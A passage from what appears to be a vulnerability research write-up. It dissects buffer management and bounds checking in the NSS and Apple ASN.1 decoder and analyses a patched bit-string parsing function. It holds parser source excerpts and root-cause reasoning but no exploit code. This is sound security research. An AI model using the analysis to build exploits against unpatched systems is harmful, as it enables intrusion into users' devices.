 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; sec_asn1d_confirm_identifier </span><span class="c1">(</span><span class="c3">state</span><span class="c1">);</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c16">break</span><span class="c1">;</span></p>
 <p class="c6"><span class="c1">...</span></p></td></tr></tbody></table>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span>Each state method which could consume input is passed a pointer (</span><span class="c7">buf</span><span>) to the next unconsumed byte in the raw input buffer and a count of the remaining unconsumed bytes (</span><span class="c7">len</span><span class="c9">).</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span>It&#39;s then up to each of those methods to return how much of the input they consumed, and signal any errors by updating the context object&#39;s </span><span class="c7">status</span><span class="c9">&nbsp;field.</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span>The parser can be recursive: a state can set its </span><span class="c7">-&gt;place</span><span class="c9">&nbsp;field to a state which expects to handle a parsed child state and then allocate a new child state. For example when parsing an ASN.1 sequence:</span></p>
 <p class="c0 c15"><span class="c9"></span></p><a id="t.8eeaeea98c81e67701fd5ceeb50d55e628cd74e9"></a><a id="t.7"></a><table class="c25"><tbody><tr class="c18"><td class="c5" colspan="1" rowspan="1">
 <p class="c6"><span class="c3">&nbsp; state</span><span class="c1">-&gt;</span><span class="c3">place </span><span class="c1">=</span><span class="c3">&nbsp;duringSequence</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; state </span><span class="c1">=</span><span class="c3">&nbsp;sec_asn1d_push_state </span><span class="c1">(</span><span class="c3">state</span><span class="c1">-&gt;</span><span class="c3">top</span><span class="c1">,</span><span class="c3">&nbsp;state</span><span class="c1">-&gt;</span><span class="c3">theTemplate </span><span class="c1">+</span><span class="c3">&nbsp;</span><span class="c11">1</span><span class="c1">,</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; state</span><span class="c1">-&gt;</span><span class="c3">dest</span><span class="c1">,</span><span class="c3">&nbsp;PR_TRUE</span><span class="c1">);</span></p></td></tr></tbody></table>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span>The current state sets its own next state to </span><span class="c7">duringSequence</span><span>&nbsp;then calls </span><span class="c7">sec_asn1d_push_state</span><span>&nbsp;which allocates a new state object, with a new template and a copy of the parent&#39;s </span><span class="c7">dest</span><span class="c9">&nbsp;field.</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span class="c7">sec_asn1d_push_state</span><span>&nbsp;updates the context&#39;s </span><span class="c7">current</span><span>&nbsp;field such that the next loop around </span><span class="c7">SEC_ASN1DecoderUpdate</span><span class="c9">&nbsp;will see this child state as the current state:</span></p>
 <p class="c0 c15"><span class="c9"></span></p><a id="t.4abe94039e6236e075539145b72103a31c4c2c18"></a><a id="t.8"></a><table class="c25"><tbody><tr class="c18"><td class="c5" colspan="1" rowspan="1">
 <p class="c6"><span class="c3">&nbsp; &nbsp; cx</span><span class="c1">-&gt;</span><span class="c3">current </span><span class="c1">=</span><span class="c3">&nbsp;new_state</span><span class="c1">;</span></p></td></tr></tbody></table>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span>Note that the initial value of the </span><span class="c7">place</span><span>&nbsp;field (which determines the current state) of the newly allocated child is determined by the template. The final state in the state machine path followed by that child will then be responsible for popping itself off the state stack such that the </span><span class="c7">duringSequence</span><span class="c9">&nbsp;state can be reached by its parent to consume the results of the child.</span></p><h2 class="c32 c8 c15" id="h.wuusy9tj5c7g"><span class="c31 c28">Buffer management</span></h2>
 <p class="c6 c8 c15"><span>The buffer management is where the NSS ASN.1 parser starts to get really mind bending. If you read through the code you will notice an extreme lack of bounds checks when the output buffers are being filled in - there basically are none. For example, </span><span class="c7">sec_asn1d_parse_leaf</span><span>&nbsp;which copies the raw encoded string bytes for example simply </span><span class="c7">memcpy&#39;</span><span class="c9">s into the output buffer with no bounds checks that the length of the string matches the size of the buffer.</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span class="c9">Rather than using explicit bounds checks to ensure lengths are valid, the memory safety is instead supposed to be achieved by relying on the fact that decoding valid ASN.1 can never produce output which is larger than its input.</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span>That is, there are no forms of decompression or input expansion so any parsed output data must be equal to or shorter in length than the input which encoded it. NSS leverages this and over-allocates all output buffers to simply be as large as their inputs.</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span>For primitive strings this is quite simple: the length and input are provided so there&#39;s nothing really to </span><span>go that wrong</span><span class="c9">. But for constructed strings this gets a little fiddly...</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span class="c9">One way to think of constructed strings is as trees of substrings, nested up to 32-levels deep. Here&#39;s an example:</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"></p>
  
  
 <p class="c6 c8 c15"><span class="c9"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiWnoJoAO5ls05zNgJGzqsN-UTCkUxRl-o1NzXip0CTwvdJOCTXWxYeXnoMWZ47Ndbk0T0AZTcfOhRCGFN8sVbag29apOW4fp-hbZ5RWUsmgdhjcNBhcqqox8S-mGrZL3Lu4nAwpMTJBeStprEvPyqPm7vH84d9IdTRReK-S72A3IGlAPZis6Oj90QS/s706/image3%20%281%29%281%29.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiWnoJoAO5ls05zNgJGzqsN-UTCkUxRl-o1NzXip0CTwvdJOCTXWxYeXnoMWZ47Ndbk0T0AZTcfOhRCGFN8sVbag29apOW4fp-hbZ5RWUsmgdhjcNBhcqqox8S-mGrZL3Lu4nAwpMTJBeStprEvPyqPm7vH84d9IdTRReK-S72A3IGlAPZis6Oj90QS/s706/image3%20%281%29%281%29.png" border="0" alt="An outer constructed definite length string with three children: a primitive string &quot;abc&quot;, a constructed indefinite length string and a primitive string &quot;ghi&quot;. The constructed indefinite string has two children, a primitive string &quot;def&quot; and an end-of-contents marker." style="max-height: 750; max-width: 600px;" title="An outer constructed definite length string with three children: a primitive string &quot;abc&quot;, a constructed indefinite length string and a primitive string &quot;ghi&quot;. The constructed indefinite string has two children, a primitive string &quot;def&quot; and an end-of-contents marker." /></a></span></p>
 <p class="c34 c8 c15"><span class="c27 c26">An outer constructed definite length string with three children: a primitive string &quot;abc&quot;, a constructed indefinite length string and a primitive string &quot;ghi&quot;. The constructed indefinite string has two children, a primitive string &quot;def&quot; and an end-of-contents marker.</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span>We start with a constructed definite length string. The string&#39;s length value </span><span class="c7">L</span><span class="c9">&nbsp;is the complete size of the remaining input which makes up this string; that number of input bytes should be parsed as substrings and concatenated to form the parsed output.</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span>At this point the NSS ASN.1 string parser allocates the output buffer for the parsed output string using the length </span><span class="c7">L</span><span>&nbsp;of that first input string. This buffer is an over-allocated worst case. The part which makes it really fun though is that NSS allocates the output buffer then promptly throws away that length! This might not be so obvious from quickly glancing through the code though. The buffer which is allocated is stored as the </span><span class="c7">Data</span><span class="c9">&nbsp;field of a buffer wrapper type:</span></p>
 <p class="c0 c15"><span class="c9"></span></p><a id="t.a656829ca34a4322a58a35aea96a9b25f2306e10"></a><a id="t.9"></a><table class="c25"><tbody><tr class="c18"><td class="c5" colspan="1" rowspan="1">
 <p class="c6"><span class="c16">typedef</span><span class="c3">&nbsp;</span><span class="c16">struct</span><span class="c3">&nbsp;cssm_data </span><span class="c1">{</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; size_t </span><span class="c20">Length</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; uint8_t </span><span class="c1">*</span><span class="c3">&nbsp;__nullable </span><span class="c20">Data</span><span class="c1">;</span></p>
 <p class="c6"><span class="c1">}</span><span class="c3">&nbsp;</span><span class="c20">SecAsn1Item</span><span class="c1">,</span><span class="c3">&nbsp;</span><span class="c20">SecAsn1Oid</span><span class="c1">;</span></p></td></tr></tbody></table>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span>(Recall that we passed in a pointer to a </span><span class="c7">SecAsn1Item</span><span>&nbsp;in the template; it&#39;s the </span><span class="c30">Data</span><span class="c9">&nbsp;field of that which gets filled in with the allocated string buffer pointer here. This type is very slightly different between NSS and Apple&#39;s fork, but the difference doesn&#39;t matter here.)</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span>That </span><span class="c7">Length</span><span>&nbsp;field is </span><span class="c17">not</span><span>&nbsp;the size of the allocated </span><span class="c7">Data</span><span>&nbsp;buffer. It&#39;s a (type-specific) count which determines how many bits or bytes of the buffer pointed to by </span><span class="c30">Data</span><span>&nbsp;are valid. I say type-specific because for bit-strings </span><span class="c7">Length</span><span>&nbsp;is stored in units of bits but for other strings it&#39;s in units of bytes. (</span><span class="c21"><a class="c241" href="https://bugzilla.mozilla.org/show_bug.cgi?id=1245528">CVE-2016-1950</a></span><span class="c9">&nbsp;was a bug in NSS where the code mixed up those units.)</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span>Rather than storing the allocated buffer size along with the buffer pointer, each time a substring/child string is encountered the parser walks back up the stack of currently-being-parsed states to find the inner-most definite length string. </span><span>As it&#39;s walking up the states it examines each state to determine how much of its input it has consumed in order to be able to determine whether it&#39;s the case that the current to-be-parsed substring is indeed completely enclosed within the inner-most enclosing definite length string.</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span class="c9">If that sounds complicated, it is! The logic which does this is here, and it took me a good few days to pull it apart enough to figure out what this was doing:</span></p>
 <p class="c0 c15"><span class="c9"></span></p><a id="t.9b3aa6a323d6b6a86a105c4a1b098ad0fb513030"></a><a id="t.10"></a><table class="c25"><tbody><tr class="c18"><td class="c5" colspan="1" rowspan="1">
 <p class="c6"><span class="c3">sec_asn1d_state </span><span class="c1">*</span><span class="c3">parent </span><span class="c1">=</span><span class="c3">&nbsp;sec_asn1d_get_enclosing_construct</span><span class="c1">(</span><span class="c3">state</span><span class="c1">);</span></p>
 <p class="c6"><span class="c16">while</span><span class="c3">&nbsp;</span><span class="c1">(</span><span class="c3">parent </span><span class="c1">&amp;&amp;</span><span class="c3">&nbsp;parent</span><span class="c1">-&gt;</span><span class="c3">indefinite</span><span class="c1">)</span><span class="c3">&nbsp;</span><span class="c1">{</span></p>
 <p class="c6"><span class="c3">&nbsp; parent </span><span class="c1">=</span><span class="c3">&nbsp;sec_asn1d_get_enclosing_construct</span><span class="c1">(</span><span class="c3">parent</span><span class="c1">);</span></p>
 <p class="c6"><span class="c1">}</span></p>
 <p class="c6 c14"><span class="c2"></span></p>
 <p class="c6"><span class="c16">unsigned</span><span class="c3">&nbsp;</span><span class="c16">long</span><span class="c3">&nbsp;remaining </span><span class="c1">=</span><span class="c3">&nbsp;parent</span><span class="c1">-&gt;</span><span class="c3">pending</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">parent </span><span class="c1">=</span><span class="c3">&nbsp;state</span><span class="c1">;</span></p>
 <p class="c6"><span class="c16">do</span><span class="c3">&nbsp;</span><span class="c1">{</span></p>
 <p class="c6"><span class="c3">&nbsp; </span><span class="c16">if</span><span class="c3">&nbsp;</span><span class="c1">(!</span><span class="c3">sec_asn1d_check_and_subtract_length</span><span class="c1">(&amp;</span><span class="c3">remaining</span><span class="c1">,</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;parent</span><span class="c1">-&gt;</span><span class="c3">consumed</span><span class="c1">,</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;state</span><span class="c1">-&gt;</span><span class="c3">top</span><span class="c1">)</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c1">||</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c23">/* If parent-&gt;indefinite is true, parent-&gt;contents_length is</span></p>
 <p class="c6"><span class="c23">&nbsp; &nbsp; &nbsp; &nbsp;* zero and this is a no-op. */</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c1">!</span><span class="c3">sec_asn1d_check_and_subtract_length</span><span class="c1">(&amp;</span><span class="c3">remaining</span><span class="c1">,</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;parent</span><span class="c1">-&gt;</span><span class="c3">contents_length</span><span class="c1">,</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;state</span><span class="c1">-&gt;</span><span class="c3">top</span><span class="c1">)</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c1">||</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c23">/* If parent-&gt;indefinite is true, then ensure there is enough</span></p>
 <p class="c6"><span class="c23">&nbsp; &nbsp; &nbsp; &nbsp;* space for an EOC tag of 2 bytes. */</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c1">(</span><span class="c3">&nbsp; parent</span><span class="c1">-&gt;</span><span class="c2">indefinite</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c1">&amp;&amp;</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c1">!</span><span class="c3">sec_asn1d_check_and_subtract_length</span><span class="c1">(&amp;</span><span class="c3">remaining</span><span class="c1">,</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c11">2</span><span class="c1">,</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;state</span><span class="c1">-&gt;</span><span class="c3">top</span><span class="c1">)</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c1">)</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; </span><span class="c1">)</span><span class="c3">&nbsp;</span><span class="c1">{</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c23">/* This element is larger than its enclosing element, which is</span></p>
 <p class="c6"><span class="c23">&nbsp; &nbsp; &nbsp; &nbsp;* invalid. */</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c16">return</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; </span><span class="c1">}</span></p>
 <p class="c6"><span class="c1">}</span><span class="c3">&nbsp;</span><span class="c16">while</span><span class="c3">&nbsp;</span><span class="c1">((</span><span class="c3">parent </span><span class="c1">=</span><span class="c3">&nbsp;sec_asn1d_get_enclosing_construct</span><span class="c1">(</span><span class="c3">parent</span><span class="c1">))</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c1">&amp;&amp;</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;parent</span><span class="c1">-&gt;</span><span class="c3">indefinite</span><span class="c1">);</span></p></td></tr></tbody></table>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span>It first walks up the state stack to find the innermost constructed definite state and uses its </span><span class="c7">state-&gt;pending</span><span>&nbsp;value as an upper bound. It then walks the state stack again and for each in-between state subtracts from that original value of </span><span class="c7">pending</span><span>&nbsp;how many bytes could have been consumed by those in between states. It&#39;s pretty clear that the </span><span class="c7">pending</span><span class="c9">&nbsp;value is therefore vitally important; it&#39;s used to determine an upper bound so if we could mess with it this &quot;bounds check&quot; could go wrong.</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span class="c9">After figuring out that this was pretty clearly the only place where any kind of bounds checking takes place I looked back at the fix more closely.</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span>We know that </span><span class="c7">sec_asn1d_parse_bit_string</span><span class="c9">&nbsp;is only the function which changed:</span></p>
 <p class="c0 c15"><span class="c9"></span></p><a id="t.42f4c91c05b2a51603f4110e33201853c8d03da3"></a><a id="t.11"></a><table class="c25"><tbody><tr class="c18"><td class="c5" colspan="1" rowspan="1">
 <p class="c6"><span class="c16">static</span><span class="c3">&nbsp;</span><span class="c16">unsigned</span><span class="c3">&nbsp;</span><span class="c16">long</span></p>
 <p class="c6"><span class="c3">sec_asn1d_parse_bit_string </span><span class="c1">(</span><span class="c3">sec_asn1d_state </span><span class="c1">*</span><span class="c3">state</span><span class="c1">,</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c16">const</span><span class="c3">&nbsp;</span><span class="c16">char</span><span class="c3">&nbsp;</span><span class="c1">*</span><span class="c3">buf</span><span class="c1">,</span><span class="c3">&nbsp;</span><span class="c16">unsigned</span><span class="c3">&nbsp;</span><span class="c16">long</span><span class="c3">&nbsp;len</span><span class="c1">)</span></p>
 <p class="c6"><span class="c1">{</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; </span><span class="c16">unsigned</span><span class="c3">&nbsp;</span><span class="c16">char</span><span class="c3">&nbsp;</span><span class="c16">byte</span><span class="c1">;</span></p>
 <p class="c6"><span class="c2">&nbsp; &nbsp; </span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; </span><span class="c23">/*PORT_Assert (state-&gt;pending &gt; 0); */</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; PORT_Assert </span><span class="c1">(</span><span class="c3">state</span><span class="c1">-&gt;</span><span class="c3">place </span><span class="c1">==</span><span class="c3">&nbsp;beforeBitString</span><span class="c1">);</span></p>
 <p class="c6 c14"><span class="c2"></span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; </span><span class="c16">if</span><span class="c3">&nbsp;</span><span class="c1">((</span><span class="c3">state</span><span class="c1">-&gt;</span><span class="c3">pending </span><span class="c1">==</span><span class="c3">&nbsp;</span><span class="c11">0</span><span class="c1">)</span><span class="c3">&nbsp;</span><span class="c1 c12">||</span><span class="c3 c12">&nbsp;</span><span class="c1 c12">(</span><span class="c3 c12">state</span><span class="c1 c12">-&gt;</span><span class="c3 c12">contents_length </span><span class="c1 c12">==</span><span class="c3 c12">&nbsp;</span><span class="c11 c12">1</span><span class="c1 c12">)</span><span class="c1">)</span><span class="c3">&nbsp;</span><span class="c1">{</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c16">if</span><span class="c3">&nbsp;</span><span class="c1">(</span><span class="c3">state</span><span class="c1">-&gt;</span><span class="c3">dest </span><span class="c1">!=</span><span class="c3">&nbsp;NULL</span><span class="c1">)</span><span class="c3">&nbsp;</span><span class="c1">{</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c20">SecAsn1Item</span><span class="c3">&nbsp;</span><span class="c1">*</span><span class="c3">item </span><span class="c1">=</span><span class="c3">&nbsp;</span><span class="c1">(</span><span class="c20">SecAsn1Item</span><span class="c3">&nbsp;</span><span class="c1">*)(</span><span class="c3">state</span><span class="c1">-&gt;</span><span class="c3">dest</span><span class="c1">);</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; item</span><span class="c1">-&gt;</span><span class="c20">Data</span><span class="c3">&nbsp;</span><span class="c1">=</span><span class="c3">&nbsp;NULL</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; item</span><span class="c1">-&gt;</span><span class="c20">Length</span><span class="c3">&nbsp;</span><span class="c1">=</span><span class="c3">&nbsp;</span><span class="c11">0</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; state</span><span class="c1">-&gt;</span><span class="c3">place </span><span class="c1">=</span><span class="c3">&nbsp;beforeEndOfContents</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c1">}</span></p>
 <p class="c6"><span class="c3 c12">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c16 c12">if</span><span class="c1 c12">(</span><span class="c3 c12">state</span><span class="c1 c12">-&gt;</span><span class="c3 c12">contents_length </span><span class="c1 c12">==</span><span class="c3 c12">&nbsp;</span><span class="c11 c12">1</span><span class="c1 c12">)</span><span class="c3 c12">&nbsp;</span><span class="c1 c12">{</span></p>
 <p class="c6"><span class="c3 c12">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c23 c12">/* skip over (unused) remainder byte */</span></p>
 <p class="c6"><span class="c3 c12">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c12 c16">return</span><span class="c3 c12">&nbsp;</span><span class="c11 c12">1</span><span class="c1 c12">;</span></p>
 <p class="c6"><span class="c3 c12">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c1 c12">}</span></p>
 <p class="c6"><span class="c3 c12">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c16 c12">else</span><span class="c3 c12">&nbsp;</span><span class="c1 c12">{</span></p>
 <p class="c6"><span class="c3 c12">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c16 c12">return</span><span class="c3 c12">&nbsp;</span><span class="c11 c12">0</span><span class="c1 c12">;</span></p>
 <p class="c6"><span class="c3 c12">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c1 c12">}</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; </span><span class="c1">}</span></p>
 <p class="c6"><span class="c2">&nbsp; &nbsp; </span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; </span><span class="c16">if</span><span class="c3">&nbsp;</span><span class="c1">(</span><span class="c3">len </span><span class="c1">==</span><span class="c3">&nbsp;</span><span class="c11">0</span><span class="c1">)</span><span class="c3">&nbsp;</span><span class="c1">{</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; state</span><span class="c1">-&gt;</span><span class="c3">top</span><span class="c1">-&gt;</span><span class="c3">status </span><span class="c1">=</span><span class="c3">&nbsp;needBytes</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c16">return</span><span class="c3">&nbsp;</span><span class="c11">0</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; </span><span class="c1">}</span></p>
 <p class="c6"><span class="c2">&nbsp; &nbsp; </span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; </span><span class="c16">byte</span><span class="c3">&nbsp;</span><span class="c1">=</span><span class="c3">&nbsp;</span><span class="c1">(</span><span class="c16">unsigned</span><span class="c3">&nbsp;</span><span class="c16">char</span><span class="c1">)</span><span class="c3">&nbsp;</span><span class="c1">*</span><span class="c3">buf</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; </span><span class="c16">if</span><span class="c3">&nbsp;</span><span class="c1">(</span><span class="c16">byte</span><span class="c3">&nbsp;</span><span class="c1">&gt;</span><span class="c3">&nbsp;</span><span class="c11">7</span><span class="c1">)</span><span class="c3">&nbsp;</span><span class="c1">{</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; dprintf</span><span class="c1">(</span><span class="c22">&quot;decodeError: parse_bit_string remainder oflow\n&quot;</span><span class="c1">);</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; PORT_SetError </span><span class="c1">(</span><span class="c3">SEC_ERROR_BAD_DER</span><span class="c1">);</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; state</span><span class="c1">-&gt;</span><span class="c3">top</span><span class="c1">-&gt;</span><span class="c3">status </span><span class="c1">=</span><span class="c3">&nbsp;decodeError</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c16">return</span><span class="c3">&nbsp;</span><span class="c11">0</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; </span><span class="c1">}</span></p>
 <p class="c6"><span class="c2">&nbsp; &nbsp; </span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; state</span><span class="c1">-&gt;</span><span class="c3">bit_string_unused_bits </span><span class="c1">=</span><span class="c3">&nbsp;</span><span class="c16">byte</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; state</span><span class="c1">-&gt;</span><span class="c3">place </span><span class="c1">=</span><span class="c3">&nbsp;duringBitString</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; state</span><span class="c1">-&gt;</span><span class="c3">pending </span><span class="c1">-=</span><span class="c3">&nbsp;</span><span class="c11">1</span><span class="c1">;</span></p>
 <p class="c6"><span class="c2">&nbsp; &nbsp; </span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; </span><span class="c16">return</span><span class="c3">&nbsp;</span><span class="c11">1</span><span class="c1">;</span></p>
 <p class="c6"><span class="c1">}</span></p></td></tr></tbody></table>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span>The highlighted region of the function are the characters which were removed by the patch. This function is meant to return the number of input bytes (pointed to by </span><span class="c7">buf</span><span>) which it consumed and my initial hunch was to notice that the patch removed a path through this function where you could get the count of input bytes consumed and </span><span class="c30">pending</span><span>&nbsp;out-of-sync. It should be the case that when they return 1 in the removed code they also decrement </span><span class="c30">state-&gt;pending</span><span class="c9">, as they do in the other place where this function returns 1.</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span class="c9">I spent quite a while trying to figure out how you could actually turn that into something useful but in the end I don&#39;t think you can.</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span class="c9">So what else is going on here?</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span>This state is reached with </span><span class="c7">buf</span><span>&nbsp;pointing to the first byte after the length value of a primitive bitstring. </span><span class="c7">state-&gt;contents_length</span><span>&nbsp;is the value of that parsed length. Bitstrings, as discussed earlier, are a unique ASN.1 string type in that they have an extra meta-data byte at the beginning (the unused-bits count byte.) It&#39;s perfectly fine to have a definite zero-length string - indeed that&#39;s (sort-of) handled earlier than this in the </span><span class="c7">prepareForContents</span><span>&nbsp;state, which short-circuits straight to </span><span class="c7">afterEndOfContents</span><span class="c9">:</span></p>
 <p class="c0 c15"><span class="c9"></span></p><a id="t.f2043ae4749f0304b8055ed271eca98bdb5b783d"></a><a id="t.12"></a><table class="c25"><tbody><tr class="c18"><td class="c5" colspan="1" rowspan="1">
 <p class="c6"><span class="c16">if</span><span class="c3">&nbsp;</span><span class="c1">(</span><span class="c3">state</span><span class="c1">-&gt;</span><span class="c3">contents_length </span><span class="c1">==</span><span class="c3">&nbsp;</span><span class="c11">0</span><span class="c3">&nbsp;</span><span class="c1">&amp;&amp;</span><span class="c3">&nbsp;</span><span class="c1">(!</span><span class="c3">&nbsp;state</span><span class="c1">-&gt;</span><span class="c3">indefinite</span><span class="c1">))</span><span class="c3">&nbsp;</span><span class="c1">{</span></p>
 <p class="c6"><span class="c3">&nbsp; </span><span class="c23">/*</span></p>
 <p class="c6"><span class="c23">&nbsp; &nbsp;* A zero-length simple or constructed string; we are done.</span></p>
 <p class="c6"><span class="c23">&nbsp; &nbsp;*/</span></p>
